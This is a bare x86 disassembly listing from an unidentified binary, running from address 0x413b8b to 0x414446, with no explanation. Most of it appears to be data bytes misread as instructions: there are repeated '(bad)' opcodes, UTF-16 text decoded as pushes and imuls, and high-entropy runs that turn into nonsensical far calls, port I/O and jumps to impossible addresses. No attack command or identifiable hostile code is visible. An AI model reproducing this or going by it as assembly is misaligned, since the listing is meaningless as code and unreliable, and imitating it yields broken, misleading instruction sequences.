  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	mov    cs,WORD PTR fs:[edx+0x49]
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0x9c000001
  413f0d:	mov    edi,0xd59e93cf
  413f12:	adc    eax,0xdb0735df
  413f17:	push   ebp
  413f18:	sbb    edi,esi
  413f1a:	lods   al,BYTE PTR ds:[esi]
  413f1b:	xor    al,0x89
  413f1d:	mov    eax,0xf0d357a8
  413f22:	loope  0x413fa2
  413f24:	inc    eax
  413f25:	rol    BYTE PTR [ebp-0x80],0xfa
  413f29:	inc    ebx
  413f2a:	jb     0x413f61
  413f2c:	out    0x72,eax
  413f2e:	sahf   
  413f2f:	jmp    0x413eb7
  413f31:	push   ss
  413f32:	addr16 jl 0x413f7e
  413f35:	dec    ecx
  413f36:	pop    esp
  413f37:	push   edi
  413f38:	js     0x413f55
  413f3a:	jns    0x413f2d
  413f3c:	mov    al,0x4
  413f3e:	dec    ebp
  413f3f:	sub    bh,BYTE PTR [ebp-0x7]
  413f42:	rol    DWORD PTR [eax+edx*1+0x15436bb7],0x5d
  413f4a:	test   BYTE PTR cs:[edi],cl
  413f4d:	dec    ebp
  413f4e:	out    dx,eax
  413f4f:	jno    0x413f71
  413f51:	(bad)  [ebx]
  413f53:	aad    0xbb
  413f55:	inc    edx
  413f56:	imul   ecx,ebp,0x79914c34
  413f5c:	mov    ch,0x8
  413f5e:	int    0x89
  413f60:	jl     0x413f71
  413f62:	shl    BYTE PTR [ecx+0x36192550],0xd
  413f69:	in     eax,dx
  413f6a:	mov    ds:0x17c3c5f7,al
  413f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f70:	adc    eax,0x622b338a
  413f75:	bound  edi,QWORD PTR [edi-0x3c9368d7]
  413f7b:	xlat   BYTE PTR ds:[ebx]
  413f7c:	sub    edi,DWORD PTR ds:0xfbfbe9c9
  413f82:	xchg   ebp,eax
  413f83:	mov    ch,0xc2
  413f85:	mov    ds:0x444ee354,eax
  413f8a:	xchg   DWORD PTR [ebp+0x1b],ecx
  413f8d:	push   ebx
  413f8e:	adc    al,0x66
  413f90:	sbb    bl,BYTE PTR [eax-0x74]
  413f93:	outs   dx,BYTE PTR ds:[esi]
  413f94:	out    0xd2,al
  413f96:	pop    es
  413f97:	push   edi
  413f98:	xor    dh,dl
  413f9a:	ds (bad) 
  413f9c:	sbb    edi,DWORD PTR [edi+0x71df9ae7]
  413fa2:	xchg   edx,eax
  413fa3:	shr    DWORD PTR [ecx-0x2bbec83b],cl
  413fa9:	rcr    DWORD PTR [eax+0x5b78f883],cl
  413faf:	add    BYTE PTR [edi-0x39],bh
  413fb2:	cli    
  413fb3:	mov    ds:0xa668a089,al
  413fb8:	mov    esp,0x54781baa
  413fbd:	and    bh,al
  413fbf:	lods   al,BYTE PTR ds:[esi]
  413fc0:	scas   eax,DWORD PTR es:[edi]
  413fc1:	shr    DWORD PTR [esi-0x7fbe15f2],1
  413fc7:	add    eax,0xee0f1dc5
  413fcc:	cs mov dh,0xa
  413fcf:	jo     0x413ff3
  413fd1:	jecxz  0x413fd4
  413fd3:	xlat   BYTE PTR ds:[ebx]
  413fd4:	sub    ecx,DWORD PTR [edi-0x62]
  413fd7:	sub    eax,0x4acacd11
  413fdc:	int    0x8b
  413fde:	test   DWORD PTR [esi-0x1a2f9611],esi
  413fe4:	pop    eax
  413fe5:	add    eax,DWORD PTR [ebx+0xc]
  413fe8:	pushf  
  413fe9:	push   0xffffffc5
  413feb:	sub    al,0xbd
  413fed:	cld    
  413fee:	jecxz  0x413ffe
  413ff0:	(bad)  
  413ff1:	jno    0x41402b
  413ff3:	pushf  
  413ff4:	xor    eax,0x5633393e
  413ff9:	jnp    0x413fe3
  413ffb:	cmp    eax,ecx
  413ffd:	int    0xf
  413fff:	add    ebp,DWORD PTR [esi-0x33]
  414002:	xchg   ecx,eax
  414003:	jle    0x414010
  414005:	and    eax,0xbe397931
  41400a:	leave  
  41400b:	pusha  
  41400c:	add    DWORD PTR [ecx],ebx
  41400e:	cs call 0x0:0xce
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x7a9c:0xecd52e96
  414083:	hlt    
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x10000001
  41408d:	fbld   TBYTE PTR [edi]
  41408f:	nop
  414090:	outs   dx,DWORD PTR ds:[esi]
  414091:	or     esi,0xfffffff0
  414094:	sbb    al,0xaf
  414096:	scas   eax,DWORD PTR es:[edi]
  414097:	(bad)  
  414098:	in     al,0x7b
  41409a:	outs   dx,DWORD PTR ss:[esi]
  41409c:	push   eax
  41409d:	adc    BYTE PTR [eax+eax*8],dl
  4140a0:	push   edx
  4140a1:	sub    dh,BYTE PTR [ebx+0x18]
  4140a4:	neg    DWORD PTR [ebp+ebx*2+0x3129e89d]
  4140ab:	in     eax,dx
  4140ac:	test   al,0xc8
  4140ae:	enter  0x3e78,0x66
  4140b2:	cs pop es
  4140b4:	and    eax,0x21768d93
  4140b9:	mov    gs:0xd1beaac6,eax
  4140bf:	js     0x41413a
  4140c1:	mov    al,ds:0xc8cc0f9e
  4140c6:	lock call 0xe86b3dc1
  4140cc:	sub    al,0xc8
  4140ce:	out    0x9c,al
  4140d0:	jb     0x41413d
  4140d2:	inc    ebx
  4140d3:	ss sub al,0x67
  4140d6:	popf   
  4140d7:	bound  edx,QWORD PTR [ebp-0x57]
  4140da:	loopne 0x41409c
  4140dc:	jmp    0x4140a3
  4140de:	and    eax,0xc2bbf6ba
  4140e3:	sub    BYTE PTR [eax+0x59],bl
  4140e6:	mov    cl,0x95
  4140e8:	jp     0x41410f
  4140ea:	stos   DWORD PTR es:[edi],eax
  4140eb:	xchg   edx,eax
  4140ec:	(bad)  
  4140ee:	xchg   ebx,eax
  4140ef:	xchg   bh,ah
  4140f1:	sub    ebp,DWORD PTR [esi]
  4140f3:	sar    edx,cl
  4140f5:	jmp    0xf7c2d7b7
  4140fa:	dec    ecx
  4140fb:	inc    ecx
  4140fc:	pop    ds
  4140fd:	push   edi
  4140fe:	mov    bh,0x4b
  414100:	push   edi
  414101:	imul   edi,DWORD PTR [edx+edx*4-0x61],0xffffff8c
  414106:	sbb    al,0xcf
  414108:	cwde   
  414109:	outs   dx,BYTE PTR ds:[esi]
  41410a:	pushf  
  41410b:	add    dh,BYTE PTR [ebx-0x52c54df3]
  414111:	mov    BYTE PTR ds:0x1330f569,bh
  414117:	fdivr  DWORD PTR [edi+0x5fda0fdb]
  41411d:	pushf  
  41411e:	add    edi,DWORD PTR [eax+esi*8-0x5b]
  414122:	in     eax,0x2d
  414124:	iret   
  414125:	sub    al,0x59
  414127:	adc    ebp,edi
  414129:	xor    DWORD PTR [ebp+0x33],esp
  41412c:	cdq    
  41412d:	or     DWORD PTR [edx],edx
  41412f:	jb     0x414179
  414131:	or     BYTE PTR [esp+edx*1-0x5b],cl
  414135:	xor    BYTE PTR [eax+0x1a60135b],0x26
  41413c:	inc    edx
  41413d:	in     al,dx
  41413e:	imul   esi,DWORD PTR ds:0x84be1d10,0x16ac87de
  414148:	jbe    0x414130
  41414a:	pusha  
  41414b:	cdq    
  41414c:	mov    edx,0x2b7e361
  414151:	fwait
  414152:	cmp    ah,bl
  414154:	mov    esi,0xc2a857a5
  414159:	and    ebx,DWORD PTR [ebx+0x28]
  41415c:	fidivr DWORD PTR [esi]
  41415e:	inc    eax
  41415f:	mov    ebp,0x2d6656a5
  414164:	mov    bl,0x8d
  414166:	stos   DWORD PTR es:[edi],eax
  414167:	scas   eax,DWORD PTR es:[edi]
  414168:	in     al,0x13
  41416a:	int3   
  41416b:	xchg   edx,eax
  41416c:	sbb    al,0x65
  41416e:	adc    ch,BYTE PTR [esi+0x41c8566f]
  414174:	add    esp,edx
  414176:	xor    al,0x28
  414178:	adc    esp,DWORD PTR [ecx-0x36]
  41417b:	popa   
  41417c:	outs   dx,DWORD PTR ds:[esi]
  41417d:	push   ebx
  41417e:	call   0x8dd7:0x5763fcf3
  414185:	pop    ds
  414186:	nop
  414187:	jae    0x414190
  414189:	pop    esp
  41418a:	repnz cmp ch,bl
  41418d:	or     eax,0xa41efa
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	sbb    dl,ah
  414202:	clc    
  414203:	sub    esp,esi
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0xe000001,al
  41420d:	int3   
  41420e:	add    bh,bl
  414210:	leave  
  414211:	push   esp
  414212:	sbb    DWORD PTR [edx+0x1934e86e],ebx
  414218:	xchg   esp,eax
  414219:	les    esp,FWORD PTR [eax-0x2f3b634d]
  41421f:	loopne 0x4141a9
  414221:	jp     0x41423f
  414223:	jbe    0x41423c
  414225:	push   cs
  414226:	ss push esi
  414228:	pop    ecx
  414229:	add    al,0x27
  41422b:	ret    
  41422c:	call   0xa431:0xf2dd3ca1
  414233:	adc    edx,DWORD PTR [edi+edx*2]
  414236:	leave  
  414237:	add    al,0x9b
  414239:	je     0x41425c
  41423b:	push   cs
  41423c:	fdivr  QWORD PTR [ebp+0x50]
  41423f:	inc    edi
  414240:	mov    ecx,0x8e495e65
  414245:	in     al,0x34
  414247:	mov    ebp,DWORD PTR [esi+eiz*8-0x36f95834]
  41424e:	enter  0xa330,0x8
  414252:	aaa    
  414253:	loope  0x414233
  414255:	push   0x1e
  414257:	cs (bad) 
  414259:	mov    al,ds:0x6a726898
  41425e:	popf   
  41425f:	mov    ds:0x5a32c89c,eax
  414264:	fsubp  st(4),st
  414266:	jg     0x41427c
  414268:	call   0xd3b1:0x779ff95b
  41426f:	xor    esi,DWORD PTR [eax-0x31028a2b]
  414275:	mov    ds:0x49652d46,al
  41427a:	pop    eax
  41427b:	jo     0x414221
  41427d:	pop    edi
  41427e:	bnd jbe 0x414247
  414281:	pop    ebp
  414282:	and    eax,0x2879fe04
  414287:	push   esp
  414288:	sub    al,BYTE PTR [edi-0x11]
  41428b:	adc    esp,eax
  41428d:	rcl    BYTE PTR [ecx],cl
  41428f:	sar    ebp,cl
  414291:	jns    0x41427d
  414293:	(bad)  
  414294:	ins    DWORD PTR es:[edi],dx
  414295:	adc    ch,BYTE PTR [edx-0x526d84ad]
  41429b:	mov    bh,0x4c
  41429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41429e:	dec    edx
  41429f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a0:	push   cs
  4142a1:	mov    bh,0x3e
  4142a3:	sbb    eax,0x2a77b669
  4142a8:	in     al,0xc4
  4142aa:	fidivr WORD PTR [ecx]
  4142ac:	lods   al,BYTE PTR ds:[esi]
  4142ad:	pop    ebp
  4142ae:	jmp    0x7fe113eb
  4142b3:	xor    al,cl
  4142b5:	(bad)  
  4142b6:	inc    DWORD PTR [eax]
  4142b8:	or     DWORD PTR [edx+0x3c],0xb4d54b94
  4142bf:	mov    al,ds:0x7d7f4c47
  4142c4:	inc    esp
  4142c5:	nop
  4142c6:	mov    eax,0xe4805153
  4142cb:	xchg   edx,eax
  4142cc:	cmp    dl,bh
  4142ce:	ret    
  4142cf:	xor    ch,bh
  4142d1:	sbb    esi,eax
  4142d3:	mov    al,ds:0x59014cb4
  4142d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d9:	or     DWORD PTR [edx+0x178d55],edi
  4142df:	xor    BYTE PTR [edi-0x6e],ch
  4142e2:	push   0x69eb35fc
  4142e7:	sub    eax,0xd186b89c
  4142ec:	rol    DWORD PTR [eax+0x6d],0x29
  4142f0:	mov    edi,0x2866e16
  4142f5:	dec    ebx
  4142f6:	leave  
  4142f7:	xchg   ebx,eax
  4142f8:	jecxz  0x414315
  4142fa:	mov    ebx,0x81319565
  4142ff:	sar    DWORD PTR [ebp+0x25f92834],0x5f
  414306:	adc    bh,bh
  414308:	xlat   BYTE PTR ds:[ebx]
  414309:	pop    ebx
  41430a:	mov    dl,0x23
  41430c:	(bad)  
  41430d:	fcomp  DWORD PTR [ebx+ecx*4+0x79]
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	or     ebp,DWORD PTR [ebx]
  414382:	jle    0x4143c1
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x1a000001
  41438d:	sub    DWORD PTR [edx+0x0],edi
  414390:	or     dh,BYTE PTR [ecx]
  414392:	shl    DWORD PTR [ebx],cl
  414394:	adc    al,0xcf
  414396:	mov    ?,WORD PTR [ebp-0x3e650f50]
  41439c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439d:	jo     0x414412
  41439f:	loop   0x414381
  4143a1:	sbb    bl,BYTE PTR [eax-0x3ef4b09f]
  4143a7:	into   
  4143a8:	mov    ecx,0xa14140dc
  4143ad:	or     BYTE PTR cs:[edi],cl
  4143b0:	sub    eax,0x2c93e95e
  4143b5:	loopne 0x414361
  4143b7:	cs repnz mov ?,eax
  4143bb:	lds    ebx,FWORD PTR [esi]
  4143bd:	cdq    
  4143be:	adc    eax,0x2a1ee9a6
  4143c3:	gs daa 
  4143c5:	shl    DWORD PTR [ecx-0x6d],1
  4143c8:	pop    dx
  4143ca:	popa   
  4143cb:	sub    al,0x4d
  4143cd:	outs   dx,BYTE PTR ds:[esi]
  4143ce:	xor    ah,al
  4143d0:	sbb    BYTE PTR [ecx-0x14bdb163],bl
  4143d6:	jbe    0x4143b7
  4143d8:	inc    ecx
  4143d9:	or     DWORD PTR [eax-0x79],esi
  4143dc:	jno    0x414432
  4143de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143e0:	das    
  4143e1:	push   edx
  4143e2:	jmp    0x4143cf
  4143e4:	aad    0x84
  4143e6:	pop    ebx
  4143e7:	cwde   
  4143e8:	je     0x414462
  4143ea:	ja     0x414421
  4143ec:	nop
  4143ed:	addr16 cld 
  4143ef:	xor    eax,0xdd79ea7c
  4143f4:	lods   al,BYTE PTR ds:[esi]
  4143f5:	fld    QWORD PTR [ebx]
  4143f7:	and    DWORD PTR [edi],esi
  4143f9:	xor    ebp,DWORD PTR [ebx-0x54]
  4143fc:	sub    edi,DWORD PTR [ebp-0x63]
  4143ff:	xor    BYTE PTR [ebx-0x6c],0xd4
  414403:	sbb    bl,bl
  414405:	mov    DWORD PTR [eax],esi
  414407:	inc    ebx
  414408:	ins    DWORD PTR es:[edi],dx
  414409:	lea    edi,[edx+esi*8+0x53]
  41440d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41440e:	push   ecx
  41440f:	jmp    0x81d9a533
  414414:	mov    esi,0x35f17fb4
  414419:	cmp    ecx,DWORD PTR [esi+0x28114617]
  41441f:	mov    dl,0x2d
  414421:	out    dx,al
  414422:	pop    eax
  414423:	mov    eax,0xebf61168
  414428:	inc    esi
  414429:	sub    esp,ebx
  41442b:	lea    eax,[esi-0x203e1d34]
  414431:	jo     0x414447
  414433:	or     edi,esp
  414435:	xchg   esp,eax
  414436:	call   0xadc0926
  41443b:	loope  0x41441d
  41443d:	jns    0x414447
  41443f:	pusha  
  414440:	cld    
  414441:	push   es
  414442:	mov    cl,BYTE PTR [ecx]
  414444:	xchg   esi,eax
  414445:	scas   eax,DWORD PTR es:[edi]
  414446:	popa   
